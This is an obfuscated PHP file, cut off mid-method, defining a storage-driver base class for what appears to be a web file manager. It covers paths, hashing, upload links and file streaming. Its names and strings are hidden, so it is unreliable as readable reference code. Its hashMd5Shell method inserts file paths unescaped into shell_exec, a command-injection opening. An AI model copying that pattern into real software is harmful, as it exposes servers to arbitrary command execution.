<?php
 goto c÷Ê÷ˆ—„; a‘ê ¼ìµ: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $ÇÍÛ‚ƒ– =& $_SERVER[ıÚ˜š²İ]; $this->objectDriver = array($ÇÍÛ‚ƒ–[60], $ÇÍÛ‚ƒ–[61], $ÇÍÛ‚ƒ–[62], $ÇÍÛ‚ƒ–[63], $ÇÍÛ‚ƒ–[64], $ÇÍÛ‚ƒ–[65], $ÇÍÛ‚ƒ–[66], $ÇÍÛ‚ƒ–[67], $ÇÍÛ‚ƒ–[68], $ÇÍÛ‚ƒ–[69], $ÇÍÛ‚ƒ–[70], $ÇÍÛ‚ƒ–[71]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($°Ñ‡ñºÃ) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($°Ñ‡ñºÃ, $_SERVER[ıÚ˜š²İ][8]); } return $°Ñ‡ñºÃ; } public function iconvApp($¤¡¶šÌƒ) { return $¤¡¶šÌƒ; } public function iconvSystem($Ûµ¶¦ ñ) { return $Ûµ¶¦ ñ; } public function iconvTo($¸íË¿Š†, $˜ïÌûº, $¯ÌóœÎê) { $î¬§‘ßö =& $_SERVER[ıÚ˜š²İ]; if (!$¸íË¿Š† || !function_exists($î¬§‘ßö[72])) { return $¸íË¿Š†; } static $Æ Òñ“ğ = array(); $áİ§º¥ = $˜ïÌûº . $î¬§‘ßö[73] . $¯ÌóœÎê . $î¬§‘ßö[74] . $¸íË¿Š†; if (isset($Æ Òñ“ğ[$áİ§º¥])) { return $Æ Òñ“ğ[$áİ§º¥]; } if (function_exists($î¬§‘ßö[75])) { $°ŒÇè© = @mb_convert_encoding($¸íË¿Š†, $¯ÌóœÎê, $˜ïÌûº); } else { $°ŒÇè© = @iconv($˜ïÌûº, $¯ÌóœÎê, $¸íË¿Š†); } $°ŒÇè© = $°ŒÇè© ? $°ŒÇè© : $¸íË¿Š†; if (strstr($°ŒÇè©, $î¬§‘ßö[76])) { $°ŒÇè© = str_replace($î¬§‘ßö[76], $î¬§‘ßö[11], $°ŒÇè©); } $Æ Òñ“ğ[$˜ïÌûº . $î¬§‘ßö[73] . $¯ÌóœÎê . $î¬§‘ßö[74] . $¸íË¿Š†] = $°ŒÇè©; $Æ Òñ“ğ[$¯ÌóœÎê . $î¬§‘ßö[73] . $˜ïÌûº . $î¬§‘ßö[74] . $¸íË¿Š†] = $¸íË¿Š†; $Æ Òñ“ğ[$¯ÌóœÎê . $î¬§‘ßö[73] . $˜ïÌûº . $î¬§‘ßö[74] . $°ŒÇè©] = $¸íË¿Š†; $Æ Òñ“ğ[$˜ïÌûº . $î¬§‘ßö[73] . $¯ÌóœÎê . $î¬§‘ßö[74] . $°ŒÇè©] = $°ŒÇè©; return $°ŒÇè©; } public function getPathInner($°‹å¿®€) { $ú’Ö™É = IO::init($°‹å¿®€); return $ú’Ö™É->path; } public function getPathOuter($ØÉ¶ë¹˜) { $Šéµø¹ =& $_SERVER[ıÚ˜š²İ]; $æâŞèÆù = strlen(trim($this->pathBase, $Šéµø¹[8])); $ØÉ¶ë¹˜ = substr(trim($ØÉ¶ë¹˜, $Šéµø¹[8]), $æâŞèÆù); return $this->pathDriver . $Šéµø¹[8] . ltrim($ØÉ¶ë¹˜, $Šéµø¹[8]); } public function isParentOf($«Ñ¤ãö», $–æ™ÙıÛ) { $ô¶‘¼™ =& $_SERVER[ıÚ˜š²İ]; $«Ñ¤ãö» = rtrim(strtolower($«Ñ¤ãö»), $ô¶‘¼™[8]) . $ô¶‘¼™[8]; $–æ™ÙıÛ = rtrim(strtolower($–æ™ÙıÛ), $ô¶‘¼™[8]) . $ô¶‘¼™[8]; $ïÂ“òÅö = strpos($–æ™ÙıÛ, $«Ñ¤ãö») === 0; return $ïÂ“òÅö; } public function getType() { $“†òü„­ =& $_SERVER[ıÚ˜š²İ]; $³ç«•ëÕ = str_replace($“†òü„­[77], $“†òü„­[12], get_class($this)); return strtolower($³ç«•ëÕ); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($Ò‚—‚‘, $ãÓœó») { $šÉ§İ¦™ =& $_SERVER[ıÚ˜š²İ]; $ÃÙö»Ÿ› = rtrim($Ò‚—‚‘, $šÉ§İ¦™[8]) . $šÉ§İ¦™[8] . $ãÓœó»; $åŠ¶Âê = $this->exist($ÃÙö»Ÿ›); return $åŠ¶Âê ? $ÃÙö»Ÿ› : !1; } public function setModifyTime($úíîØ›°, $óÒ…ÖÊæ = '') { } public function renameObject($ÈŸé­›Õ, $ñğ¦ÜÉ‰) { $Şª¶ò¹¥ = $ñğ¦ÜÉ‰; $ÈŸé­›Õ = $this->getPathOuter($ÈŸé­›Õ); $ñğ¦ÜÉ‰ = $this->pathFather($ÈŸé­›Õ) . $ñğ¦ÜÉ‰; $’³ÊË› = IO::copy($ÈŸé­›Õ, $this->pathFather($ÈŸé­›Õ), REPEAT_RENAME_FOLDER, $Şª¶ò¹¥); if ($’³ÊË›) { IO::remove($ÈŸé­›Õ); } return $’³ÊË› ? $ñğ¦ÜÉ‰ : !1; } public function tempFile($Ù‹Î­ÆÈ = '', $Ü—×İÀú = '') { if (!$Ù‹Î­ÆÈ) { $Ù‹Î­ÆÈ = rand_string(15); } $ƒÅ£©ïÜ = TEMP_FILES . rand_string(15) . $_SERVER[ıÚ˜š²İ][8]; @mkdir($ƒÅ£©ïÜ, DEFAULT_PERRMISSIONS, !0); $¦ÏÎÙ¸¢ = $ƒÅ£©ïÜ . $Ù‹Î­ÆÈ; @touch($¦ÏÎÙ¸¢); if ($Ü—×İÀú) { file_put_contents($¦ÏÎÙ¸¢, $Ü—×İÀú); } return $¦ÏÎÙ¸¢; } public function tempFileRemve($ÀÆ‘¶“ß) { @unlink($ÀÆ‘¶“ß); @rmdir($this->pathFather($ÀÆ‘¶“ß)); } public function mkfile($‰È°Œ, $™ŞÜÀ… = '', $»’Íâ‰ø = REPEAT_RENAME) { } public function mkdir($ú¹Ş—ò•, $á„êâµ‘ = REPEAT_SKIP) { } public function delFile($¥˜ƒ÷¨Ø) { } public function delFolder($Ò²š×”£) { } public function copyFile($™ƒù·âœ, $ı”¢°‚Ì) { } public function moveFile($ÔÒ¦³£™, $àÕìÒâÇ) { } public function remove($†å¨Ô€è) { if ($this->isFile($†å¨Ô€è)) { return $this->delFile($†å¨Ô€è); } return $this->delFolder($†å¨Ô€è); } public function rename($Íåµ˜Ó, $¦ÍÏÅ) { } public function exist($­’®èö) { } public function findByHash($çÙüÄè = '', $šŞä•íş = '') { return !1; } public function isFile($â‡˜æ³‚) { } public function isFolder($»éÑ°ôÛ) { } public function size($¸ß¢Œƒ) { } public function info($ÏÓšÜßÇ) { } public function infoSimple($Äœ‰½‹) { return $this->info($Äœ‰½‹); } public function infoAuth($ãòö•ş) { return $this->info($ãòö•ş); } public function infoFull($»¿‚ÇŠ³) { return $this->info($»¿‚ÇŠ³); } public function infoFullSimple($á²©»ˆ ) { return $this->info($á²©»ˆ ); } public function infoWithChildren($ñô˜ˆä) { $©»¤±şí =& $_SERVER[ıÚ˜š²İ]; static $Ã›˜¥ÇÆ = array(); if (isset($Ã›˜¥ÇÆ[$ñô˜ˆä])) { return $Ã›˜¥ÇÆ[$ñô˜ˆä]; } $ı‹‹ƒÍà = $this->info($ñô˜ˆä); if ($ı‹‹ƒÍà && $ı‹‹ƒÍà[$©»¤±şí[33]] == $©»¤±şí[78]) { $‘€¢ø­ƒ = array($©»¤±şí[79] => 0, $©»¤±şí[80] => 0, $©»¤±şí[81] => 0); $this->infoChildren($ñô˜ˆä, $‘€¢ø­ƒ); $ı‹‹ƒÍà[$©»¤±şí[79]] = $‘€¢ø­ƒ[$©»¤±şí[79]]; $ı‹‹ƒÍà[$©»¤±şí[82]] = array($©»¤±şí[83] => $‘€¢ø­ƒ[$©»¤±şí[80]], $©»¤±şí[84] => $‘€¢ø­ƒ[$©»¤±şí[81]]); $Ã›˜¥ÇÆ[$ñô˜ˆä] = $ı‹‹ƒÍà; } return $ı‹‹ƒÍà; } public function listPath($Í—£¼, $å»Å½È³ = false) { } public function has($¾ÆÔ¡§Ú, $·õ¯Ñ† = false, $€ÖĞ£Ş = false) { } public function canRead($‡Æø×ù) { } public function canWrite($ˆ˜¤Õ–) { } public function getContent($££ØÆ‘Ä) { } public function setContent($ÉÎ—‰š¿, $úÚçÄ‘ = '') { } protected function infoChildren($œ²Âø¾ü, &$’Ëñ£¥ı) { $İÆ¶€˜Ş =& $_SERVER[ıÚ˜š²İ]; check_abort_echo(); $Ã”…¤Æä = $this->listPath($œ²Âø¾ü, !0); $Ã”…¤Æä = array_merge($Ã”…¤Æä[$İÆ¶€˜Ş[85]], $Ã”…¤Æä[$İÆ¶€˜Ş[86]]); foreach ($Ã”…¤Æä as $³Ÿ³‚Œ) { if ($³Ÿ³‚Œ[$İÆ¶€˜Ş[33]] == $İÆ¶€˜Ş[78]) { $’Ëñ£¥ı[$İÆ¶€˜Ş[81]]++; $•…®´»© = $this->getPathInner($³Ÿ³‚Œ[$İÆ¶€˜Ş[87]]); $this->infoChildren($•…®´»©, $’Ëñ£¥ı); } else { $’Ëñ£¥ı[$İÆ¶€˜Ş[80]]++; $’Ëñ£¥ı[$İÆ¶€˜Ş[79]] += $³Ÿ³‚Œ[$İÆ¶€˜Ş[79]]; } } } public function fileSubstr($İı´«åë, $¥Œøî“õ, $ÖæÅì–) { } public function listAll($Ûş·Ñçà) { } public function listAllMake($æ¬ùî, &$ìËÃãå) { $™±æä¦ =& $_SERVER[ıÚ˜š²İ]; check_abort_echo(); $˜‰‘Áóà = $this->listPath($æ¬ùî, !0); if (!$˜‰‘Áóà) { return; } $ƒŸ–àİ = array_merge($˜‰‘Áóà[$™±æä¦[85]], $˜‰‘Áóà[$™±æä¦[86]]); foreach ($ƒŸ–àİ as $Á£öÃÛ“) { $Öâ½˜Ğò = $Á£öÃÛ“[$™±æä¦[33]] == $™±æä¦[78]; $–—ƒ´ÊÄ = array($™±æä¦[87] => $Á£öÃÛ“[$™±æä¦[87]], $™±æä¦[78] => $Öâ½˜Ğò); if (isset($Á£öÃÛ“[$™±æä¦[79]])) { $–—ƒ´ÊÄ[$™±æä¦[79]] = $Á£öÃÛ“[$™±æä¦[79]]; } if (isset($Á£öÃÛ“[$™±æä¦[88]])) { $–—ƒ´ÊÄ[$™±æä¦[88]] = $Á£öÃÛ“[$™±æä¦[88]]; } if (!$Öâ½˜Ğò) { $ìËÃãå[] = $–—ƒ´ÊÄ; continue; } $ìËÃãå[] = $–—ƒ´ÊÄ; $÷—ÁÌı = $Á£öÃÛ“[$™±æä¦[87]]; $ÓìÔÔ²¯ = $this->pathDriver; if (substr($Á£öÃÛ“[$™±æä¦[87]], 0, strlen($ÓìÔÔ²¯)) == $ÓìÔÔ²¯) { $÷—ÁÌı = substr($÷—ÁÌı, strlen($ÓìÔÔ²¯)); } $this->listAllMake($÷—ÁÌı, $ìËÃãå); } } public function listAllSimple($ØîÙªíØ, $É‘±üñë = false) { $©õŸÊ·· = $this->listAll($ØîÙªíØ); return $this->listAllSimpleMake($©õŸÊ··, $this->getPathOuter($ØîÙªíØ), $É‘±üñë); } public function listAllSimpleMake($ÊÔÉòó‚, $©®Å» …, $À¯ÔÓ‹ª) { $¾îî†Í… =& $_SERVER[ıÚ˜š²İ]; $¬Ê›çŸ½ = array(); $©®Å» … = rtrim(get_path_father($©®Å» …), $¾îî†Í…[8]) . $¾îî†Í…[8]; foreach ($ÊÔÉòó‚ as $éÃı¢­¿) { $™ãÜ¡ÀÖ = array($¾îî†Í…[87] => $éÃı¢­¿[$¾îî†Í…[87]], $¾îî†Í…[89] => $éÃı¢­¿[$¾îî†Í…[87]], $¾îî†Í…[78] => $éÃı¢­¿[$¾îî†Í…[78]]); if (isset($éÃı¢­¿[$¾îî†Í…[79]]) && !$éÃı¢­¿[$¾îî†Í…[78]]) { $™ãÜ¡ÀÖ[$¾îî†Í…[79]] = $éÃı¢­¿[$¾îî†Í…[79]]; } if (isset($éÃı¢­¿[$¾îî†Í…[88]])) { $™ãÜ¡ÀÖ[$¾îî†Í…[88]] = $éÃı¢­¿[$¾îî†Í…[88]]; } if (is_array($éÃı¢­¿[$¾îî†Í…[90]])) { $™ãÜ¡ÀÖ[$¾îî†Í…[89]] = $éÃı¢­¿[$¾îî†Í…[90]][$¾îî†Í…[87]]; $™ãÜ¡ÀÖ[$¾îî†Í…[79]] = $éÃı¢­¿[$¾îî†Í…[90]][$¾îî†Í…[79]]; $™ãÜ¡ÀÖ[$¾îî†Í…[88]] = $éÃı¢­¿[$¾îî†Í…[90]][$¾îî†Í…[88]]; } else { if (substr($éÃı¢­¿[$¾îî†Í…[87]], 0, strlen($©®Å» …)) == $©®Å» …) { $™ãÜ¡ÀÖ[$¾îî†Í…[87]] = substr($éÃı¢­¿[$¾îî†Í…[87]], strlen($©®Å» …)); } } $ó×·¾ = $éÃı¢­¿[$¾îî†Í…[78]] ? $¾îî†Í…[8] : $¾îî†Í…[12]; $™ãÜ¡ÀÖ[$¾îî†Í…[89]] = rtrim($™ãÜ¡ÀÖ[$¾îî†Í…[89]], $¾îî†Í…[8]) . $ó×·¾; $™ãÜ¡ÀÖ[$¾îî†Í…[87]] = $¾îî†Í…[8] . trim($™ãÜ¡ÀÖ[$¾îî†Í…[87]], $¾îî†Í…[8]) . $ó×·¾; if (!$À¯ÔÓ‹ª) { $×ß„È¬Ô = explode($¾îî†Í…[8], trim($™ãÜ¡ÀÖ[$¾îî†Í…[87]], $¾îî†Í…[8])); $™ãÜ¡ÀÖ[$¾îî†Í…[87]] = $¾îî†Í…[8] . implode($¾îî†Í…[8], array_slice($×ß„È¬Ô, 1)) . $ó×·¾; } $¬Ê›çŸ½[] = $™ãÜ¡ÀÖ; } return array_sort_by($¬Ê›çŸ½, $¾îî†Í…[87]); } public function upload($Ìíø¾è›, $²½ıÓøÚ, $½Æ±µõÚ = false, $·Ê¨û» = REPEAT_REPLACE) { } public function uploadFileByID($¤‰¶ÍŸµ, $åŒúúçÖ, $ï‹âëô) { } public function uploadFileByPath($ÆØÂ–„Ş, $òƒÉöÅ©, $°â¥ŒĞ = array()) { } public function isUploadServer() { $˜‘ÕÇ†Ã =& $_SERVER[ıÚ˜š²İ]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $˜‘ÕÇ†Ã[91]) { return !0; } return $GLOBALS[$˜‘ÕÇ†Ã[6]][$˜‘ÕÇ†Ã[92]][$˜‘ÕÇ†Ã[93]]; } public function isFileOutServer() { $ö¢¶ŸÆç =& $_SERVER[ıÚ˜š²İ]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $ö¢¶ŸÆç[91]) { return !0; } return $GLOBALS[$ö¢¶ŸÆç[6]][$ö¢¶ŸÆç[92]][$ö¢¶ŸÆç[94]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($Åµ‚Ü€û) { $Ó¢…èïû =& $_SERVER[ıÚ˜š²İ]; if (!$this->isCdnHost()) { return $Åµ‚Ü€û; } return str_replace(trim(get_url_root($Åµ‚Ü€û), $Ó¢…èïû[8]), trim($this->cdnHost, $Ó¢…èïû[8]), $Åµ‚Ü€û); } public function uploadLink($Æ¿¼îä¸, $ØãÊÆŠ† = 0) { $øê¬´® =& $_SERVER[ıÚ˜š²İ]; if ($this->isUploadServer()) { return; } $ÔªÚÖû€ = $this->getType(); if (!in_array($ÔªÚÖû€, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $á¹üÏ­È = 1024 * 1024 * 10; $›îú–©´ = $ØãÊÆŠ† <= $á¹üÏ­È ? $øê¬´®[95] : $øê¬´®[96]; $Š¤ŠøËÆ = (!$ØãÊÆŠ† ? 1 : ceil($ØãÊÆŠ† / pow(1024, 3))) * 3600 * 4; $¢¢»¿¹Ğ = $this->{$›îú–©´}($Æ¿¼îä¸, $Š¤ŠøËÆ); if ($¢¢»¿¹Ğ) { $¢¢»¿¹Ğ[$øê¬´®[97]] = $Æ¿¼îä¸; $¢¢»¿¹Ğ[$øê¬´®[98]] = $ÔªÚÖû€; } return $¢¢»¿¹Ğ; } public function uploadFormData($İÕé€°Š, $±Ñû»ñÓ = 3600) { } public function uploadMultiData($Å‚±îì, $…¤¨Ê‹Â = 3600) { } public function multiUploadFormData($º„æÒŠ, $µ¸§´Ä¸ = 3600) { return $this->uploadMultiData($º„æÒŠ, $µ¸§´Ä¸); } public function download($ˆÇáÖ“ª, $¬ŸúÃ—‡) { } public function ext($É¹Í¥úì) { $ÑŒ¿¶† =& $_SERVER[ıÚ˜š²İ]; if (strpos($É¹Í¥úì, $ÑŒ¿¶†[8]) === -1) { $¬˜ÉßñÇ = $É¹Í¥úì; } else { $¬˜ÉßñÇ = $this->pathThis($É¹Í¥úì); } $›Âü³ê‘ = $ÑŒ¿¶†[12]; if (strstr($¬˜ÉßñÇ, $ÑŒ¿¶†[10])) { $›Âü³ê‘ = substr($¬˜ÉßñÇ, strrpos($¬˜ÉßñÇ, $ÑŒ¿¶†[10]) + 1); $›Âü³ê‘ = strtolower($›Âü³ê‘); } if (strlen($›Âü³ê‘) > 3 && preg_match($ÑŒ¿¶†[99], $›Âü³ê‘, $£–©‚‚)) { $›Âü³ê‘ = $ÑŒ¿¶†[12]; } return $›Âü³ê‘; } public function pathThis($èğã©˜œ) { $ºÑÙ£Å° =& $_SERVER[ıÚ˜š²İ]; $èğã©˜œ = str_replace($ºÑÙ£Å°[100], $ºÑÙ£Å°[8], rtrim($èğã©˜œ, $ºÑÙ£Å°[8])); $€”«×¼‰ = strrpos($èğã©˜œ, $ºÑÙ£Å°[8]); if ($€”«×¼‰ === !1) { return $èğã©˜œ; } return substr($èğã©˜œ, $€”«×¼‰ + 1); } public function pathFather($Èº’øÆ) { $øŸ¤ÀĞî =& $_SERVER[ıÚ˜š²İ]; $Èº’øÆ = str_replace($øŸ¤ÀĞî[100], $øŸ¤ÀĞî[8], rtrim($Èº’øÆ, $øŸ¤ÀĞî[8])); $û³ÂÒ³“ = strrpos($Èº’øÆ, $øŸ¤ÀĞî[8]); if ($û³ÂÒ³“ === !1) { return $øŸ¤ÀĞî[12]; } return substr($Èº’øÆ, 0, $û³ÂÒ³“ + 1); } public function hashSimple($”ç¾üƒÁ) { $‚Ÿ¦ßÃ½ =& $_SERVER[ıÚ˜š²İ]; if (!$”ç¾üƒÁ) { return md5($‚Ÿ¦ßÃ½[12]); } $ŠÂŠ£¯ê = $this->size($”ç¾üƒÁ); $ççİú”Ò = 200; $øóÎùÍ = 50; if ($ŠÂŠ£¯ê <= $ççİú”Ò * $øóÎùÍ) { return $this->hashMd5($”ç¾üƒÁ) . $ŠÂŠ£¯ê; } $”Äí…äÔ = intval($ŠÂŠ£¯ê / $øóÎùÍ); $À÷ÚŸ = $‚Ÿ¦ßÃ½[12]; for ($¹ÀÇ¸÷Ô = 0; $¹ÀÇ¸÷Ô < $øóÎùÍ; $¹ÀÇ¸÷Ô++) { $À÷ÚŸ .= $this->fileSubstr($”ç¾üƒÁ, $”Äí…äÔ * $¹ÀÇ¸÷Ô, $ççİú”Ò); } $À÷ÚŸ .= $this->fileSubstr($”ç¾üƒÁ, $ŠÂŠ£¯ê - $ççİú”Ò, $ççİú”Ò); return md5($À÷ÚŸ) . $ŠÂŠ£¯ê; } public static $md5Cache = array(); public function hashMd5($¢ÚÒã¿) { if (!$¢ÚÒã¿) { return md5($_SERVER[ıÚ˜š²İ][12]); } $¢ÚÒã¿ = $this->iconvSystem($¢ÚÒã¿); if (isset(self::$md5Cache[$¢ÚÒã¿])) { return self::$md5Cache[$¢ÚÒã¿]; } self::$md5Cache[$¢ÚÒã¿] = $this->hashMd5Shell($¢ÚÒã¿); if (!self::$md5Cache[$¢ÚÒã¿]) { self::$md5Cache[$¢ÚÒã¿] = @md5_file($¢ÚÒã¿); } return self::$md5Cache[$¢ÚÒã¿]; } private function hashMd5Shell($¥ÕûŞÑø) { $¶ã€í =& $_SERVER[ıÚ˜š²İ]; if (!$¥ÕûŞÑø) { return md5($¶ã€í[12]); } if (!function_exists($¶ã€í[101])) { return !1; } $Ü²Ë’’ = array($¶ã€í[102], $¶ã€í[103]); $Ë¥»¹ä° = Cache::get($¶ã€í[104]); if (!$Ë¥»¹ä°) { $óÅ—í¸š = BASIC_PATH . $¶ã€í[105]; $ÓĞêÏ°ä = md5_file($óÅ—í¸š); $Ë¥»¹ä° = $¶ã€í[106]; foreach ($Ü²Ë’’ as $ßÅòİö‘) { $ûæßç = shell_exec($ßÅòİö‘ . "\x20\42{$óÅ—í¸š}\42"); if ($ûæßç && substr(trim($ûæßç), 0, 32) == $ÓĞêÏ°ä) { $Ë¥»¹ä° = $ßÅòİö‘; break; } } Cache::set($¶ã€í[104], $Ë¥»¹ä°, 3600); } if ($Ë¥»¹ä° == $¶ã€í[106]) { return !1; } $ûæßç = shell_exec($Ë¥»¹ä° . "\40\42{$¥ÕûŞÑø}\42"); $ûæßç = str_replace($¶ã€í[107], $¶ã€í[12], $ûæßç); return substr($ûæßç, 0, 32); } public function link($†•Â›‡º) { return $†•Â›‡º; } public function fileOut($óğ¸©, $‹Ë‹æû = false, $áı¾İ“È = false, $úêØß“¶ = '') { $“†Õ‰¨£ =& $_SERVER[ıÚ˜š²İ]; $this->cacheMethod(null, null); if (!$óğ¸© || !$this->exist($óğ¸©)) { show_json(LNG($“†Õ‰¨£[108]), !1, $áı¾İ“È); } $»•â„ú = $this->getType() == $“†Õ‰¨£[109]; $î¢ù€¢ü = $GLOBALS[$“†Õ‰¨£[6]][$“†Õ‰¨£[92]][$“†Õ‰¨£[110]][$“†Õ‰¨£[111]]; $¼á™×ÉÒ = (double) $GLOBALS[$“†Õ‰¨£[6]][$“†Õ‰¨£[92]][$“†Õ‰¨£[110]][$“†Õ‰¨£[112]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $âÕšÀÍ = $this->infoFull($óğ¸©); $Õ„¼‰Õ• = $âÕšÀÍ[$“†Õ‰¨£[79]]; $§Ãœ³ÓÒ = gmdate($“†Õ‰¨£[113], $âÕšÀÍ[$“†Õ‰¨£[88]]); $İÑ£ñÜå = $áı¾İ“È ? $áı¾İ“È : $this->iconvApp($âÕšÀÍ[$“†Õ‰¨£[32]]); $äıç÷© = 0; $ÕÉÒ˜İ¢ = $Õ„¼‰Õ• - 1; $Áï¶õµü = $this->ext($İÑ£ñÜå); if (in_array($Áï¶õµü, array($“†Õ‰¨£[114], $“†Õ‰¨£[115], $“†Õ‰¨£[116], $“†Õ‰¨£[117]))) { $Áï¶õµü = $“†Õ‰¨£[118]; } if (in_array($Áï¶õµü, array($“†Õ‰¨£[119]))) { $Áï¶õµü = $“†Õ‰¨£[120]; } if (!$úêØß“¶) { $úêØß“¶ = md5($§Ãœ³ÓÒ . $Õ„¼‰Õ•); } $úêØß“¶ = $“†Õ‰¨£[121] . $úêØß“¶ . $“†Õ‰¨£[121]; $´«ÈÃåç = get_file_mime($Áï¶õµü); $“ªøıš = !0; $“ªøıš = isset($_GET[$“†Õ‰¨£[122]]) ? !1 : !0; if ($‹Ë‹æû === !1 && !mime_support($´«ÈÃåç)) { $´«ÈÃåç = $“†Õ‰¨£[123]; } header($“†Õ‰¨£[124]); header($“†Õ‰¨£[125] . $´«ÈÃåç); $¶“ñÔäÕ = rawurlencode($İÑ£ñÜå); $¶“ñÔäÕ = $“†Õ‰¨£[121] . $¶“ñÔäÕ . $“†Õ‰¨£[126] . $¶“ñÔäÕ; if ($‹Ë‹æû) { header($“†Õ‰¨£[127]); header($“†Õ‰¨£[128] . $¶“ñÔäÕ); } else { if ($“ªøıš) { header($“†Õ‰¨£[129] . $¶“ñÔäÕ); } } $÷°ÜŸè‚ = 3600 * 24 * 30; header($“†Õ‰¨£[130]); header($“†Õ‰¨£[131]); header($“†Õ‰¨£[132] . $÷°ÜŸè‚); header($“†Õ‰¨£[133] . gmdate($“†Õ‰¨£[113], time() + $÷°ÜŸè‚) . $“†Õ‰¨£[134]); if (isset($_SERVER[$“†Õ‰¨£[135]]) && strtotime($_SERVER[$“†Õ‰¨£[135]]) == $âÕšÀÍ[$“†Õ‰¨£[88]]) { header($“†Õ‰¨£[136], !0, 304); die; } if (isset($_SERVER[$“†Õ‰¨£[137]]) && $_SERVER[$“†Õ‰¨£[137]] == $úêØß“¶) { header($“†Õ‰¨£[138] . $úêØß“¶, !0, 304); die; } header($“†Õ‰¨£[138] . $úêØß“¶); header($“†Õ‰¨£[139] . $§Ãœ³ÓÒ . $“†Õ‰¨£[134]); header($“†Õ‰¨£[140] . $İÑ£ñÜå); header($“†Õ‰¨£[141]); header($“†Õ‰¨£[142] . $Õ„¼‰Õ•); header($“†Õ‰¨£[143]); Hook::trigger($“†Õ‰¨£[144], $óğ¸©, $Õ„¼‰Õ•, $İÑ£ñÜå, $Áï¶õµü); if (!$‹Ë‹æû && $Áï¶õµü == $“†Õ‰¨£[145]) { if ($Õ„¼‰Õ• > 1024 * 1024 * 5) { die; } $ï°ğºÜÅ = $this->getContent($óğ¸©); $ï°ğºÜÅ = Html::clearSVG($ï°ğºÜÅ); header($“†Õ‰¨£[146] . strlen($ï°ğºÜÅ)); echo $ï°ğºÜÅ; die; } $†‘öé· = strtolower($_SERVER[$“†Õ‰¨£[147]]); if ($»•â„ú && $†‘öé· && $î¢ù€¢ü) { if (strstr($†‘öé·, $“†Õ‰¨£[148])) { header($“†Õ‰¨£[149] . $óğ¸©); } else { if (strstr($†‘öé·, $“†Õ‰¨£[150])) { header($“†Õ‰¨£[151] . $óğ¸©); } else { if (strstr($†‘öé·, $“†Õ‰¨£[152])) { header($“†Õ‰¨£[153] . $óğ¸©); } } } if ($¼á™×ÉÒ) { header($“†Õ‰¨£[154] . $¼á™×ÉÒ); } return; } if (isset($_SERVER[$“†Õ‰¨£[155]])) { if (preg_match($“†Õ‰¨£[156], $_SERVER[$“†Õ‰¨£[155]], $¢ÑŠ÷±—)) { $äıç÷© = intval($¢ÑŠ÷±—[1]); $äıç÷© = $äıç÷© <= 0 ? 0 : ($äıç÷© >= $ÕÉÒ˜İ¢ ? $ÕÉÒ˜İ¢ : $äıç÷©); if (!empty($¢ÑŠ÷±—[2])) { $ÜÍ¥¡ò¦ = intval($¢ÑŠ÷±—[2]); $ÕÉÒ˜İ¢ = $ÜÍ¥¡ò¦ < $äıç÷© ? $äıç÷© : ($ÜÍ¥¡ò¦ >= $ÕÉÒ˜İ¢ ? $ÕÉÒ˜İ¢ : $ÜÍ¥¡ò¦); } } header($“†Õ‰¨£[157]); header("\x43\x6f\156\x74\145\x6e\x74\x2d\122\x61\x6e\x67\x65\72\x20\x62\x79\x74\145\163\x20{$äıç÷©}\55{$ÕÉÒ˜İ¢}\57" . $Õ„¼‰Õ•); } else { header($“†Õ‰¨£[158]); } header($“†Õ‰¨£[159]); header($“†Õ‰¨£[160]); $¾¿Ê¿Á² = !0; if ($_SERVER[$“†Õ‰¨£[161]] == $“†Õ‰¨£[162] && $Õ„¼‰Õ• > 1204 * 1024 * 1024 * 2) { $¾¿Ê¿Á² = !1; } if ($¾¿Ê¿Á²) { header($“†Õ‰¨£[163] . ($ÕÉÒ˜İ¢ - $äıç÷© + 1)); } if ($_SERVER[$“†Õ‰¨£[164]] == $“†Õ‰¨£[165]) { return; } $ò©ûÔáŒ = array($“†Õ‰¨£[166] => !1, $“†Õ‰¨£[167] => $äıç÷©, $“†Õ‰¨£[168] => $ÕÉÒ˜İ¢, $“†Õ‰¨£[169] => $Áï¶õµü, $“†Õ‰¨£[170] => $âÕšÀÍ, $“†Õ‰¨£[171] => $“†Õ‰¨£[12], $“†Õ‰¨£[172] => 0); $ò©ûÔáŒ = Hook::filter($“†Õ‰¨£[173], $ò©ûÔáŒ); $ã ŞöÕ´ = 1024 * 300; $’ÛÚ¸Ã‰ = 0; if ($¼á™×ÉÒ) { $’ÛÚ¸Ã‰ = intval(1000 * 1000 * ($ã ŞöÕ´ / $¼á™×ÉÒ)); } while ($äıç÷© <= $ÕÉÒ˜İ¢) { $·óÔ“¿ğ = timeFloat(); check_abort(); $åÛÒ³À = $ÕÉÒ˜İ¢ - $äıç÷© + 1; if ($åÛÒ³À <= $ã ŞöÕ´) { $ã ŞöÕ´ = $åÛÒ³À; } $ï°ğºÜÅ = $this->fileSubstr($óğ¸©, $äıç÷©, $ã ŞöÕ´); if ($ò©ûÔáŒ[$“†Õ‰¨£[166]]) { $ò©ûÔáŒ[$“†Õ‰¨£[171]] = $ï°ğºÜÅ; $ò©ûÔáŒ[$“†Õ‰¨£[172]] = $äıç÷©; $ò©ûÔáŒ = Hook::filter($“†Õ‰¨£[174], $ò©ûÔáŒ); $ï°ğºÜÅ = $ò©ûÔáŒ[$“†Õ‰¨£[171]]; } echo $ï°ğºÜÅ; $äıç÷© += $ã ŞöÕ´; if ($ã ŞöÕ´ == $åÛÒ³À) { $äıç÷© = $ÕÉÒ˜İ¢ + 1; } if ($’ÛÚ¸Ã‰) { $·î“ò‰ = intval(1000 * 1000 * (timeFloat() - $·óÔ“¿ğ)); $Á¸©ŸĞµ = $’ÛÚ¸Ã‰ - $·î“ò‰; if ($Á¸©ŸĞµ > 5) { usleep($Á¸©ŸĞµ); } } } } public function fileOutServer($«¦€ä¶, $¸Ú‡ÚÛ = false, $ù»¿’¹€ = false, $¹½î¿÷Û = '') { $this->fileOut($«¦€ä¶, $¸Ú‡ÚÛ, $ù»¿’¹€, $¹½î¿÷Û); } public function fileOutLink($üÖŒôÕ) { 